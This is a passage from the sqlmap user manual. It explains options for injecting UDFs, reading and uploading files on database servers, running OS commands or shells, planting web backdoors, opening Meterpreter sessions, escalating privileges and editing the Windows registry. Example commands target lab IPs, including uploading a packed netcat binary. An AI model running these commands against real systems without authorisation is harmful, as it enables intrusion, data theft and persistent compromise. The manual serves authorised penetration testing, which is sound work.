You can inject your own user-defined functions (UDFs) by compiling a MySQL or PostgreSQL shared library, DLL for Windows and shared object for Linux/Unix, then provide sqlmap with the path where the shared library is stored locally on your machine. sqlmap will then ask you some questions, upload the shared library on the database server file system, create the user-defined function(s) from it and, depending on your options, execute them. When you are finished using the injected UDFs, sqlmap can also remove them from the database for you. 

These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

Use option `--udf-inject` and follow the instructions.

If you want, you can specify the shared library local file system path via command line too by using `--shared-lib` option. Vice versa sqlmap will ask you for the path at runtime.

This feature is available only when the database management system is MySQL or PostgreSQL.

## File system access

### Read a file from the database server's file system

Option: `--file-read`

It is possible to retrieve the content of files from the underlying file system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. The file specified can be either a textual or a binary file. sqlmap will handle it properly. 

These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

Example against a Microsoft SQL Server 2005 target to retrieve a binary file:

    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
    --file-read "C:/example.exe" -v 1

    output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
    80386 32-bit

### Upload a file to the database server's file system

Options: `--file-write` and `--file-dest`

It is possible to upload a local file to the database server's file system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. The file specified can be either a textual or a binary file. sqlmap will handle it properly. 

These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

Example against a MySQL target to upload a binary UPX-compressed file:

    $ file /software/nc.exe.packed 
    /software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit

    $ ls -l /software/nc.exe.packed
    -rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed

    [hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, 
    same size as the local file '/software/nc.exe.packed'

## Operating system takeover

### Run arbitrary operating system command

Option and switch: `--os-cmd` and `--os-shell`

It is possible to **run arbitrary commands on the database server's underlying operating system** when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses.

On MySQL and PostgreSQL, sqlmap uploads (via the file upload functionality explained above) a shared library (binary file) containing two user-defined functions, `sys_exec()` and `sys_eval()`, then it creates these two functions on the database and calls one of them to execute the specified command, depending on user's choice to display the standard output or not. On Microsoft SQL Server, sqlmap abuses the `xp_cmdshell` stored procedure: if it is disabled (by default on Microsoft SQL Server >= 2005), sqlmap re-enables it; if it does not exist, sqlmap creates it from scratch.

When the user requests the standard output, sqlmap uses one of the enumeration SQL injection techniques (blind, inband or error-based) to retrieve it. Vice versa, if the standard output is not required, stacked query SQL injection technique is used to execute the command.

These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

Example against a PostgreSQL target:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
    --os-cmd id -v 1

    [...]

    [hh:mm:23] [INFO] database management system cleanup finished
    [hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can 
    only be deleted manually

It is also possible to simulate a real shell where you can type as many arbitrary commands as you wish. The option is `--os-shell` and has the same TAB completion and history functionalities that `--sql-shell` has. 

Where stacked queries has not been identified on the web application (e.g. PHP or ASP with back-end database management system being MySQL) and the DBMS is MySQL, it is still possible to abuse the `SELECT` clause's `INTO OUTFILE` to create a web backdoor in a writable folder within the web server document root and still get command execution assuming the back-end DBMS and the web server are hosted on the same server. sqlmap supports this technique and allows the user to provide a comma-separated list of possible document root sub-folders where try to upload the web file stager and the subsequent web backdoor. Also, sqlmap has its own tested web file stagers and backdoors for the following languages: 

* ASP
* ASP.NET
* JSP
* PHP

### Out-of-band stateful connection: Meterpreter & friends

Options and switches: `--os-pwn`, `--os-smbrelay`, `--os-bof`, `--priv-esc`, `--msf-path` and `--tmp-path`

It is possible to establish an **out-of-band stateful TCP connection between the attacker machine and the database server** underlying operating system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user's choice. 

sqlmap relies on Metasploit to create the shellcode and implements four different techniques to execute it on the database server. These techniques are:

* Database **in-memory execution of the Metasploit's shellcode** via sqlmap own user-defined function `sys_bineval()`. Supported on MySQL and PostgreSQL - switch `--os-pwn`.
* Upload and execution of a Metasploit's **stand-alone payload stager** via sqlmap own user-defined function `sys_exec()` on MySQL and PostgreSQL or via `xp_cmdshell()` on Microsoft SQL Server - switch `--os-pwn`.
* Execution of Metasploit's shellcode by performing a **SMB reflection attack** ([MS08-068](http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx)) with a UNC path request from the database server to
the attacker's machine where the Metasploit `smb_relay` server exploit listens. Supported when running sqlmap with high privileges (`uid=0`) on Linux/Unix and the target DBMS runs as Administrator on Windows - switch `--os-smbrelay`.
* Database in-memory execution of the Metasploit's shellcode by exploiting **Microsoft SQL Server 2000 and 2005
`sp_replwritetovarbin` stored procedure heap-based buffer overflow** ([MS09-004](http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx)). sqlmap has its own exploit to trigger the
vulnerability with automatic DEP memory protection bypass, but it relies on Metasploit to generate the shellcode to get executed upon successful exploitation - switch `--os-bof`.

These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857) and in the
slide deck [Expanding the control over the operating system from the database](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database).

Example against a MySQL target:

    $ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn \

    [*] Meterpreter session 1 closed.  Reason: User exit

By default MySQL on Windows runs as `SYSTEM`, however PostgreSQL runs as a low-privileged user `postgres` on both Windows and Linux. Microsoft SQL Server 2000 by default runs as `SYSTEM`, whereas Microsoft SQL Server 2005 and 2008 run most of the times as `NETWORK SERVICE` and sometimes as `LOCAL SERVICE`. 

It is possible to provide sqlmap with the `--priv-esc` switch to perform a **database process' user privilege escalation** via Metasploit's `getsystem` command which include, among others, the [kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) technique ([MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx)).

## Windows registry access

It is possible to access Windows registry when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and when the web application supports stacked queries. Also, session user has to have the needed privileges to access it. 
### Read a Windows registry key value

Option: `--reg-read`

Using this option you can read registry key values.

### Write a Windows registry key value

Option: `--reg-add`

Using this option you can write registry key values.

### Delete a Windows registry key

Option: `--reg-del`

Using this option you can delete registry keys.

### Auxiliary registry switches

Options: `--reg-key`, `--reg-value`, `--reg-data` and `--reg-type`

These switches can be used to provide data needed for proper running of options `--reg-read`, `--reg-add` and  `--reg-del`. So, instead of providing registry key information when asked, you can use them at command prompt as program arguments. 

With `--reg-key` option you specify used Windows registry key path, with `--reg-value` value item name inside provided key, with `--reg-data` value data, while with `--reg-type` option you specify type of the value item.

A sample command line for adding a registry key hive follows:

    $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add \ 
    --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1

## General

### Log HTTP(s) traffic to a textual file

Option: `-t`

This switch requires an argument that specified the textual file to write all HTTP(s) traffic generated by sqlmap - HTTP(s) requests and HTTP(s) responses. 

This is useful primarily for debug purposes.

### Flush session files

Option: `--flush-session`

As you are already familiar with the concept of a session file from the description above, it is good to know that you can flush the content of that file using option `--flush-session`. This way you can avoid the caching mechanisms implemented by default in sqlmap. Other possible way is to manually remove the session file(s). 

### Ignores query results stored in session file

Switch: `--fresh-queries`

As you are already familiar with the concept of a session file from the description above, it is good to know that you can ignore the content of that file using option `--fresh-queries`. This way you can keep the session file untouched and for a selected run, avoid the resuming/restoring of queries output. 

### Estimated time of arrival

Switch: `--eta`

It is possible to calculate and show in real time the estimated time of arrival to retrieve each query output. This is shown when the technique used to retrieve the output is any of the blind SQL injection types. 

Example against an Oracle target affected only by boolean-based blind SQL injection:

    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta

    [...]
    [hh:mm:01] [INFO] the back-end DBMS is Oracle
    [hh:mm:01] [INFO] fetching banner
    [hh:mm:01] [INFO] retrieving the length of query output
    [hh:mm:01] [INFO] retrieved: 64
    17% [========>                                          ] 11/64  ETA 00:19

Then:

    100% [===================================================] 64/64               
    [hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod

    web application technology: PHP 5.2.6, Apache 2.2.9
    back-end DBMS: Oracle
    banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'

As you can see, sqlmap first calculates the length of the query output, then estimates the time of arrival, shows the progress in percentage and counts the number of retrieved output characters. 

### Update sqlmap

Switch: `--update`

Using this option you can update the tool to the latest development version directly from the subversion repository. You obviously need Internet access. 

If, for any reason, this operation fails, run `git pull` from your sqlmap working copy. It will perform the exact same operation of switch `--update`. If you are running sqlmap on Windows, you can use the [SmartGit](http://www.syntevo.com/smartgit/index.html) client. 

This is strongly recommended **before** reporting any bug to the [mailing lists](http://www.sqlmap.org/#ml).

### Save options in a configuration INI file

Switch: `--save`

It is possible to save the command line options to a configuration INI file. The generated file can then be edited and passed to sqlmap with the `-c` option as explained above. 

### Act in non-interactive mode

Switch: `--batch`

If you want sqlmap to run as a batch tool, without any user's interaction  when sqlmap requires it, you can force that by using `--batch` switch. This will leave sqlmap to go with a default behaviour whenever user's input would be required. 

## Miscellaneous

### IDS detection testing of injection payloads

Switch: `--check-payload`

Curious to see if a [decent intrusion detection system](http://www.phpids.org) (IDS) picks up sqlmap payloads? Use this switch!

### Cleanup the DBMS from sqlmap specific UDF(s) and table(s)

Switch: `--cleanup`

It is recommended to clean up the back-end database management system from sqlmap temporary table(s) and created user-defined function(s) when you are done taking over the underlying operating system or file system. Switch `--cleanup` will attempt to clean up the DBMS and the file system wherever possible. 

### Parse and test forms' input fields

Switch: `--forms`

Say that you want to test against SQL injections a huge _search form_ or you want to test a login bypass (typically only two input fields named like _username_ and _password_), you can either pass to sqlmap the request in a request file (`-r`), set the POSTed data accordingly (`--data`) or let sqlmap do it for you! 

Both of the above mentioned instances, and many others, appear as ` <form>` and ` <input>` tags in HTML response bodies and this is where this switch comes into play.

Provide sqlmap with `--forms` as well as the page where the form can be found as the target url (`-u`) and sqlmap will request the target url for you, parse the forms it has and guide you through to test for SQL injection on those form input fields (parameters) rather than the target url provided. 

### Use Google dork results from specified page number

Option: `--gpage`

Default sqlmap behavior with option `-g` is to do a Google search and use the first 100 resulting URLs for further SQL injection testing. However, in combination with this option you can specify with this switch, `--gpage`, some page other than the first one to retrieve target URLs from. 

### Imitate smartphone

Switch: `--mobile`

[TODO]

### Parse DBMS error messages from response pages

Switch: `--parse-errors`

If the web application is configured in debug mode so that it displays in the HTTP responses the back-end database management system error messages, sqlmap can parse and display them for you.

This is useful for debugging purposes like understanding why a certain enumeration or takeover switch does not work - it might be a matter of session user's privileges and in this case you would see a DBMS error message along the lines of `Access denied for user  <SESSION USER>`. 

### Replicate dumped data into a sqlite3 database

Switch: `--replicate`

If you want to store in a local SQLite 3 database file each dumped table (`--dump` or `--dump-all`), you can provide sqlmap with the `--replicate` switch at dump phase. This will create a ` <TABLE_NAME>.sqlite3` rather than a ` <DB_NAME>/ <TABLE_NAME>.csv` file into `output/TARGET_URL/dump/` directory. 

You can then use sqlmap itself to read and query the locally created SQLite 3 file. For instance, `python sqlmap.py -d sqlite:///software/sqlmap/output/192.168.136.131/dump/testdb.sqlite3 --table`.
